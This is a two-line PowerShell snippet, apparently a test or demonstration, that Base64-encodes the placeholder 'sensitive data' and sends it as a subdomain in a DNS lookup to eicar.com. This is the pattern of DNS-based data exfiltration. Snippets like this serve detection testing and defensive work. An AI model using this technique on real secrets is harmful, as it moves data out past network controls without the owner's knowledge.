$encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("sensitive data"))
nslookup $encoded.eicar.com
